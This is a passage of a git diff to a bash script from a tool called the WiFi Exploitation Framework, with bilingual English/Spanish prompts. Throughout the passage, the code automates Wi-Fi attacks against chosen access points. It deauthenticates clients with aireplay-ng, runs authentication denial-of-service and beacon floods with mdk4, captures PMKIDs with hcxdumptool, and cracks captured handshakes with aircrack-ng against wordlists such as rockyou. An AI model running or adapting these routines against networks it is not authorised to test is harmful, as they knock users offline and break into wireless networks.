+    echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
+    echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
+    echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
+    color_output_no_line "*" "Selecciona un diccionario: " && read dic_option
+  fi
 
   if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
     wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
@@ -555,177 +1164,212 @@ function ask_dict(){
   elif [ -f "${dic_option}" ]; then
     wordlist_to_use="${dic_option}"
 
+  elif [ "$dic_option" == "exit" ] || [ "$dic_option" == "quit" ]; then
+    ctrl_c
+
   else
-    echo -e "${blueC}Especified wordlist file doesn't exist! Selecting rockyou.txt by default${endC}"
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC}Especified wordlist file doesn't exist! Selecting rockyou.txt by default${endC}"
+    else
+      echo -e "${blueC}El diccionario especificado no existe! Seleccionando rockyou.txt por defecto${endC}"
+    fi
     wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
 
   fi
 }
 
-# Handshake Cracking
-function handshake_crack(){
-  if [ -f "/opt/wef/main/captures/${name}/Capture-01.cap" ]; then
-    sleep 0.4; ask_dict; sleep 0.4; echo
-    aircrack-ng -w ${wordlist_to_use} "/opt/wef/main/captures/${name}/Capture-01.cap"; sleep 0.3
-    good_output "+" "Cracking process completed"; sleep 1
-    reset_info
-    keep_exit
+# Check if at least 1 handshake has been captured
+function check_captured_handshakes(){
+  if [ "$(check_handshake)" -gt "0" ]; then
+    if [ "$lang" == "en" ]; then
+      good_output "+" "$(check_handshake) WPA handshakes captured"
+    else
+      good_output "+" "$(check_handshake) handshakes WPA capturados"
+    fi
+
   else
-    color_output_ln "X" "Handshakes file not found\n"
-    exit 0
+    if [ "$lang" == "en" ]; then
+      color_output "*" "No WPA handshakes captured"
+    else
+      color_output "*" "No se han capturado handshakes WPA"
+    fi
   fi
 }
 
-# Report Generator Function
-function report-gen(){
-  if [ ! -f "/opt/wef/main/logs/${name}.log" ]; then
-    touch "/opt/wef/main/logs/${name}.log" 2>/dev/null
-  fi
 
-  if [ ! "${name}" ]; then
-    name="Not especified"
-  fi
 
-  if [ ! "${channel}" ]; then
-    channel="Not especified"
-  fi
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="Not especified"
-  fi
+#
+# Access Points related functions
+#
 
-  # Log file format
-  echo -e "[WEF] WiFi Exploitation Framework
----------------------------------
-Date of the attack: ${actual_date}
-Type of attack: ${type_of_attack}
-Target Access Point: ${name}
-Duration of the attack: ${attack_time}
-Channel of the AP: ${channel}
----------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
+function check_ap_list(){
+  if [ ! -f "/tmp/.scan_output" ] || [ "$scan_on_each_attack" == "true" ]; then # Check if an AP scan already exists
+    # Check config file (first time)
+    scan_type=$(awk -F "=" '/scan_type/ {print $2}' /opt/wef/wef.cnf)
+    if [ "${scan_type}" == "" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output_no_line "*" "This is the first time you scan APs, do you want to use 2.4Gh, 5Ghz or both? You can change this later in /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}both${blueC}]: " && read scan_option
+      else
+        color_output_no_line "*" "Esta es la primera vez que escaneas APs, quieres usar 2.4Ghz, 5Ghz o ambos? Puedes cambiar esto mas tarde en /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}both${blueC}]: " && read scan_option
+      fi
+
+      if [ "${scan_option}" == "2" ] || [ "${scan_option}" == "2.4" ]; then
+        cat /opt/wef/wef.cnf | grep -v "scan_type" > /opt/wef/wef.cnf # Avoid possible errors
+        echo "scan_type=2.4" >> /opt/wef/wef.cnf
+        check_ap_list
+      elif [ "${scan_option}" == "5" ]; then
+        cat /opt/wef/wef.cnf | grep -v "scan_type" > /opt/wef/wef.cnf # Avoid possible errors
+        echo "scan_type=5" >> /opt/wef/wef.cnf
+        check_ap_list
+      elif [ "${scan_option}" == "both" ]; then
+        cat /opt/wef/wef.cnf | grep -v "scan_type" > /opt/wef/wef.cnf # Avoid possible errors
+        echo "scan_type=both" >> /opt/wef/wef.cnf
+        check_ap_list
+      else
+        if [ "$lang" == "en" ]; then
+          color_output "X" "Invalid option!"
+        else
+          color_output "X" "Opción inválida!"
+        fi
+        check_ap_list
+      fi
+
+    elif [ "${scan_type}" == "2.4" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output_ln "*" "Scanning nearby 2.4Ghz access points...\n"
+      else
+        color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz...\n"
+      fi
+      timeout 25 bash -c "wash -2 -a -i ${netCard}" | tee /tmp/.scan_output
+
+    elif [ "${scan_type}" == "5" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output_ln "*" "Scanning nearby 5Ghz access points...\n"
+      else
+        color_output_ln "*" "Escaneando puntos de acceso cercanos de 5Ghz...\n"
+      fi
+      timeout 25 bash -c "wash -5 -a -i ${netCard}" | tee /tmp/.scan_output
+
+    elif [ "${scan_type}" == "both" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output_ln "*" "Scanning nearby 2.4Ghz and 5Ghz access points...\n"
+      else
+        color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz y 5Ghz...\n"
+      fi
+      timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee /tmp/.scan_output
+
+    fi
+
+  else # If it exists, read content
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Access points list:\n"
+    else
+      color_output_ln "*" "Lista de APs:\n"
+    fi
+    cat /tmp/.scan_output
+  fi
 }
 
-# Deauth all clients
-function deauth_all_clients(){
-  sleep 0.3
-  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read catch_handshakes
+# Used to refresh/update AP list
+function ap_scan(){
+  scan_type=$(awk -F "=" '/scan_type/ {print $2}' /opt/wef/wef.cnf)
 
-  # Check user input to start airodump or not
-  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
-    xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
-    air2_PID=$!
+  if [ "${scan_type}" == "2.4" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Scanning nearby 2.4Ghz access points...\n"
+    else
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz...\n"
+    fi
+    timeout 25 bash -c "wash -2 -a -i ${netCard}" | tee /tmp/.scan_output
+
+  elif [ "${scan_type}" == "5" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Scanning nearby 5Ghz access points...\n"
+    else
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 5Ghz...\n"
+    fi
+    timeout 25 bash -c "wash -5 -a -i ${netCard}" | tee /tmp/.scan_output
+
+  elif [ "${scan_type}" == "both" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Scanning nearby 2.4Ghz and 5Ghz access points...\n"
+    else
+      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz y 5Ghz...\n"
+    fi
+    timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee /tmp/.scan_output
+  fi
+
+  if [ "$lang" == "en" ]; then
+    good_output_ln "+" "Scan completed"
+  else
+    good_output_ln "+" "Escaneo completado"
+  fi
+}
+
+function list_aps(){
+  if [ -f "/tmp/.scan_output" ]; then
+    echo; cat /tmp/.scan_output
+  else
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "APs list not found. Execute 'scan'"
+    else
+      color_output_ln "*" "Lista de APs no encontrada. Ejecuta 'scan'"
+    fi
+  fi
+}
+
+
+
+#
+# Attack functions start here
+#
+
+# Main deauthentication function
+function deauth_attack(){
+  clear
+  check_ap_list # Show APs info or scan APs if it hasn't been done
+  
+  log_back_to_menu
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  # Let the user choose the AP to attack if name is duplicated. It often occurs with 5Ghz networks
+  parse_info
+
+  echo
+  if [ "$lang" == "en" ]; then
+    echo -e "${blueC}Type of deauth attack:${endC}"
+    color_output "1" "Deauthenticate all clients"
+    color_output "2" "Deauthenticate one client"
+  else
+    echo -e "${blueC}Tipo de ataque de deautenticación:${endC}"
+    color_output "1" "Deautenticar a todos los clientes"
+    color_output "2" "Deautenticar un cliente"
   fi
 
   echo
-  color_output_no_line "*" "Packets to send (default=10): " && read packets_to_send
-
-  if [ ! "$packets_to_send" ]; then
-    packets_to_send="10"
-  fi
-
-  progress_bar 2 0.2 "*" "Starting Deauthentication attack"
-
-  iwconfig ${netCard} channel ${channel}
-  if [ "$verbose" == "0" ]; then
-    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
-  elif [ "$verbose" == "1" ]; then
-    echo
-    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null
-  fi
-
-  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
-    progress_bar 4 2 "*" "Waiting while clients reconect to capture handshakes"
-    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
-  fi
-
-  check_and_create "/opt/wef/main/captures/${name}"
-  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.2
-  good_output_ln "+" "Attack completed"; sleep 0.1
-  report-gen
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
-	
-  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
-    echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read cracking_option
-  fi
-
-  sleep 0.1; if [ "${cracking_option}" == "y" ] || [ "${cracking_option}" == "yes" ]; then
-    handshake_crack
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Choose an option >> " && read deauth_option
   else
-    reset_info; keep_exit
-  fi
-}
+    color_output_no_line "*" "Selecciona una opción >> " && read deauth_option
+  fi; echo
 
-# Deauth one client
-function deauth_one_client(){
-  sleep 0.3
-  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read catch_handshakes
+  if [ "${deauth_option}" == "back" ]; then
+    return
 
-  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
-  air2_PID=$!
+  elif [ "${deauth_option}" == "exit" ] || [ "$deauth_option" == "quit" ]; then
+    ctrl_c
 
-  ask_mac2
-
-  if [ "${catch_handshakes}" == "n" ] || [ "${catch_handshakes}" == "no" ]; then
-    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
-  fi
-
-  sleep 0.1; echo
-  color_output_no_line "*" "Packets to send (default=10): " && read packets_to_send; sleep 0.3
-
-  if [ "$packets_to_send" == "" ]; then
-    packets_to_send="10"
-  fi
-
-  progress_bar 2 0.2 "*" "Starting Deauthentication attack"
-
-  if [ "$verbose" == "0" ]; then
-    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} &>/dev/null
-  elif [ "$verbose" == "1" ]; then
-    echo
-    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} 2>/dev/null
-  fi
-
-  if [ "$catch_handshakes" == "y" ] || [ "$catch_handshakes" == "yes" ]; then
-    progress_bar 4 2 "*" "Waiting while client reconect to capture its handshake"
-    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
-  fi
-
-  check_and_create "/opt/wef/main/captures/${name}/"
-  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.3
-  good_output_ln "+" "Attack completed"; sleep 0.1
-  report-gen
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
-
-  if [ "$catch_handshakes" == "y" ] || [ "$catch_handshakes" == "yes" ]; then
-    echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
-  fi
-
-  sleep 0.1; if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
-    handshake_crack
-  else
-    reset_info; keep_exit
-  fi
-}
-
-# Deauthentication Function
-function deauth_attack(){
-  clear; banner1; sleep 0.3
-
-  color_output_ln "1" "Deauthenticate all clients"
-  color_output "2" "Deauthenticate one client\n"; sleep 0.1
-
-  color_output_no_line "WEF" "Choose an option > " && read deauth_option
-  if [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ]; then
-    color_output_ln "X" "Unknown option!"; sleep 1
+  elif [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ] && [ "${deauth_option}" != "all" ] && [ "${deauth_option}" != "one" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output_ln "X" "Unknown option!"; sleep 0.75
+    else
+      color_output_ln "X" "Opción inválida!"; sleep 0.75
+    fi
     deauth_attack
   fi
-
-  check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2
-
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 
   if [ "${deauth_option}" == "1" ] || [ "${deauth_option}" == "all" ]; then
     deauth_all_clients
@@ -734,507 +1378,1215 @@ function deauth_attack(){
   fi
 }
 
-# PMKID Cracking
-function pmkid_crack(){
-  file_to_crack="/opt/wef/main/captures/${name}/pmkid_hash"
+# Deauth all clients
+function deauth_all_clients(){
+  check_and_create "/opt/wef/main/captures/${name}"
+  ask_handshakes
 
-  if [ -f "${file_to_crack}" ] && [ "$(wc -l "${file_to_crack}")" != "0" ]; then
-    sleep 0.3; ask_dict; sleep 0.3; echo
+  default="10"
+  ask_packets
+  if [ "$packets_to_send" == "back" ]; then
+    if [ "$c_h" == "true" ]; then
+      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+    fi
+    return
+  fi; sleep 0.1
 
-    hashcat -m 22000 "${file_to_crack}" "${wordlist_to_use}" -d 1 ; sleep 0.3
-    good_output_ln "+" "Cracking process completed"; sleep 1
-    reset_info
-    keep_exit
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C if you want to stop it"
   else
-    color_output_ln "X" "Handshakes not captured or not found"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C si quieres pararlo"
+  fi
+
+  iwconfig ${netCard} channel ${channel} # Configure the interface on the same channel
+  if [[ $verbose == 0 ]]; then
+    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
+  elif [[ $verbose == 1 ]]; then
+    echo
+    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null
+  fi
+
+  if [ "${c_h}" == "true" ]; then # Enter here is user wants to capture handshakes
+    echo
+    if [ "$lang" == "en" ]; then
+      progress_bar 4 2.5 "*" "Waiting while clients reconect to AP to capture handshakes"
+    else
+      progress_bar 4 2.5 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
+    fi
+    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+
+    check_captured_handshakes
+
+    if [ "$lang" == "en" ]; then
+      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    else
+      color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    fi
+  fi
+
+  report-gen
+  log_completed
+  ask_to_crack_handshakes
+
+  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
+    handshake_crack
+  else
+    reset_info
     keep_exit
   fi
 }
 
-# Inhibitor Function
-function inhibitor(){
-  sleep 0.1; trap inhibition_c INT # Change Ctrl + C keyboard interrupt function
+function deauth_one_client(){
+  check_and_create "/opt/wef/main/captures/${name}"
+  ask_handshakes
+  ask_mac2
+  if [ "$client_mac" == "back" ]; then
+    if [ "$c_h" == "true" ]; then
+      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+    fi
+    return
+  fi
 
-  progress_bar 2 0.4 "*" "Getting AP channel"
+  if [ "${c_h}" != "true" ]; then
+    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+  fi
 
-  if [ -f "scan_output" ]; then
-    channel_to_inhibit=$(cat scan_output | grep -i "${ap_to_inhibit}$" | head -n 1 | awk '{print $2}')
+  default="10"
+  ask_packets
+  if [ "$packets_to_send" == "back" ]; then
+    if [ "$c_h" == "true" ]; then
+      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+    fi
+    return
+  fi; sleep 0.1
+
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C if you want to stop it"
   else
-    channel_to_inhibit=$(timeout 28 bash -c "wash -2 -5 -s -a -i ${netCard}" | grep -i "${ap_to_inhibit}$" | head -n 1 | awk '{print $2}')
+    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C si quieres pararlo"
   fi
 
-  iwconfig ${netCard} channel ${channel_to_inhibit}
-  progress_bar 2 0.4 "*" "Starting inhibition"
-  color_output_ln "WEF" "Press Ctrl + C to stop attack"
-
-  if [ "${verbose}" == "0" ]; then
-    aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
-  elif [ "${verbose}" == "1" ]; then
+  if [[ $verbose == 0 ]]; then
+    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} &>/dev/null
+  elif [[ $verbose == 1 ]]; then
     echo
-    aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard}
-    echo
+    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} 2>/dev/null
   fi
 
-  sleep 0.1
-  good_output_ln "+" "Inhibition completed"; sleep 0.1
+  if [ "${c_h}" == "true" ]; then
+    echo
+    if [ "$lang" == "en" ]; then
+      progress_bar 4 2.2 "*" "Waiting while client reconects to AP to capture handshake"
+    else
+      progress_bar 4 2.2 "*" "Esperando mientras el cliente se reconecta al AP para capturar su handshake"
+    fi
+    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+
+    check_captured_handshakes
+
+    if [ "$lang" == "en" ]; then
+      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    else
+      color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    fi
+  fi
+
+  report-gen
+  log_completed
+  ask_to_crack_handshakes
+
+  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
+    handshake_crack
+  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
+    ctrl_c
+  else
+    reset_info
+    keep_exit
+  fi
 }
 
 # Auth Attack
 function auth_attack(){
-  clear; banner2; sleep 0.3
+  clear
+  check_ap_list # Show APs info or scan APs if it hasn't been done yet
+  log_back_to_menu
 
-  check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
-
-  check_and_create "/opt/wef/main/captures/${name}"
-
-  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read handshake_option
-
-  if [ "${handshake_option}" == "y" ] || [ "${handshake_option}" == "yes" ]; then
-    xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
-    air2_PID=$!
+  default="120s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
-  progress_bar 2 0.2 "*" "Starting Authentication attack"
+  check_and_create "/opt/wef/main/captures/${name}" # Create dir
+  ask_handshakes # Ask user if he/she wants to capture handshakes
 
-  if [ "$verbose" == "0" ]; then
-    mdk4 ${netCard} a -i ${ap_mac} &>/dev/null
-  elif [ "$verbose" == "1" ]; then
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Authentication DoS attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl + C si quieres pararlo"
+  fi
+
+  iwconfig ${netCard} channel ${channel}
+  if [[ $verbose == 0 ]]; then
+    mdk4 ${netCard} a -i ${ap_mac} &>/dev/null &
+  elif [[ $verbose == 1 ]]; then
     echo
-    mdk4 ${netCard} a -i ${ap_mac} 2>/dev/null
-  fi; sleep 0.1
+    mdk4 ${netCard} a -i ${ap_mac} &
+  fi
+  mdk4_PID=$!
+  sleep "${attack_time}"
+  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
   
-  if [ "$handshake_option" == "y" ] || [ "$handshake_option" == "yes" ]; then
-    progress_bar 4 2 "*" "Waiting while clients reconect to capture handshakes"
-    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
-  fi; sleep 0.3
+  if [ "$c_h" == "true" ]; then
+    echo
+    if [ "$lang" == "en" ]; then
+      progress_bar 4 2.2 "*" "Waiting while clients reconect to AP to capture handshakes"
+    else
+      progress_bar 4 2.2 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
+    fi
 
-  good_output_ln "+" "Authentication Attack completed"; sleep 0.1
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"
-  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null
+    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
 
-  report-gen; reset_info; sleep 1; keep_exit
+    check_captured_handshakes
+
+    if [ "$lang" == "en" ]; then
+      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    else
+      color_output "*" "Captura guardada en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+    fi
+  fi
+
+  report-gen
+  log_completed
+  reset_info
+  keep_exit
 }
 
 # Beacon Attack
 function beacon_flood(){
-  clear; banner3; sleep 0.3
-
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2
+  log_back_to_menu
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  default="300s"; ask_time
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="300"
+  default="300s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
-  color_output_ln "WEF" "Type of attack:"
-  color_output_ln "1" "With a custom wordlist of AP names"
-  color_output "2" "With random AP names"
+  if [ "$lang" == "en" ]; then
+    echo -e "\n${blueC}Type of attack:${endC}"
+    color_output "1" "With a custom wordlist of AP names"
+    color_output "2" "With random AP names (default)"
+  else
+    echo -e "\n${blueC}Tipo de ataque:${endC}"
+    color_output "1" "Con un diccionario personalizado de nombres"
+    color_output "2" "Con nombres aleatorios (por defecto)"
+  fi
+
   echo
-  color_output_no_line "WEF" "Choose an option > " && read beacon_option
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Choose an option >> " && read beacon_option
+  else
+    color_output_no_line "*" "Selecciona una opción >> " && read beacon_option
+  fi
 
-  check_and_create "/opt/wef/main/captures/${name}/"; sleep 0.1
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  if [ "$beacon_option" == "back" ]; then
+    return
+  elif [ "$beacon_option" == "exit" ] || [ "$beacon_option" == "quit" ]; then
+    ctrl_c
+  elif [ ! "$beacon_option" ]; then
+    beacon_option="2"
+  elif [ "$beacon_option" != "1" ] && [ "$beacon_option" != "2" ]; then
+    beacon_option="2"
+  fi
 
-  color_output_ln "*" "Starting Beacon Flood attack..."; sleep 0.3
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Beacon Flood attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl + C si quieres pararlo"
+  fi
 
   iwconfig ${netCard} channel ${channel}; sleep 0.2 # Change channel to target one
 
-  if [ "$beacon_option" == "2" ] && [ "$verbose" == "0" ]; then
-    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null"
-  elif [ "$beacon_option" == "2" ] && [ "$verbose" == "1" ]; then
+  if [ "$beacon_option" == "2" ] && [[ $verbose == 0 ]]; then
+    mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null &
+  elif [ "$beacon_option" == "2" ] && [[ $verbose == 1 ]]; then
     echo
-    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200"
-  elif [ "$beacon_option" == "1" ] && [ "$verbose" == "0" ]; then
-    echo -ne "\n${blueC}[${endC}${yC}WEF${endC}${blueC}] File with the AP names:${endC} " && read names_file
-    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 -f \"${names_file}\" &>/dev/null"
-  elif [ "$beacon_option" == "1" ] && [ "$verbose" == "1" ]; then
+    mdk4 ${netCard} b -c ${channel} -s 200 &
+  elif [ "$beacon_option" == "1" ] && [[ $verbose == 0 ]]; then
+    if [ "$lang" == "en" ]; then
+      color_output_no_line "*" "File with the AP names: " && read names_file
+    else
+      color_output_no_line "*" "Archivo con los nombres de los APs: " && read names_file
+    fi
+    mdk4 ${netCard} b -c ${channel} -s 200 -f "${names_file}" &>/dev/null &
+  elif [ "$beacon_option" == "1" ] && [[ $verbose == 1 ]]; then
     echo
-    color_output_no_line "WEF" "File with the AP names: " && read names_file
+    if [ "$lang" == "en" ]; then
+      color_output_no_line "*" "File with the AP names: " && read names_file
+    else
+      color_output_no_line "*" "Archivo con los nombres de los APs: " && read names_file
+    fi
     echo
-    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 -f \"${names_file}\""
-  fi; sleep 0.3
+    mdk4 ${netCard} b -c ${channel} -s 200 -f "${names_file}" &
+  fi
 
-  good_output_ln "+" "Beacon Flood attack completed"; sleep 0.1
+  mdk4_PID=$!
+  sleep "${attack_time}"
+  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+
   report-gen
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
+  log_completed
   reset_info
-
   keep_exit
 }
 
 # PMKID Attack
 function pmkid_attack(){
-  clear; banner1; sleep 0.3
-
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2
+  log_back_to_menu
 
-  default="180"; ask_time
+  # Disable monitor mode as hcxtools may break if interface isn't in monitor mode
+  airmon-ng stop ${netCard} &>/dev/null
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="180"
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
+
+  default="180s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
   # Parse wifi info
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  pmkid_bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1 | tr -d ":")
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  if [[ $channel -le 14 ]]; then
+    pmkid_channel="${channel}a"
+  elif [[ $channel -gt 14 ]]; then
+    pmkid_channel="${channel}b"
+  fi
 
-  progress_bar 2 0.2 "*" "Starting PMKID attack"
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting PMKID attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque PMKID, presiona Ctrl + C si quieres pararlo"
+  fi
+
   check_and_create "/opt/wef/main/captures/${name}"
 
-  #if [ "${verbose}" == "0" ]; then
-  echo
-    #timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} -o pmkid_capture --enable_status=1 | grep -i 'PMKIDR' &>/dev/null"
-  #elif [ "${verbose}" == "1" ]; then
-  timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} -o pmkid_capture --enable_status=1"
-  #fi
+  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/opt/wef/main/captures/${name}/pmkid_capture" | grep -v "bye-bye" &
+  hcx_PID=$!
+  sleep "${attack_time}"
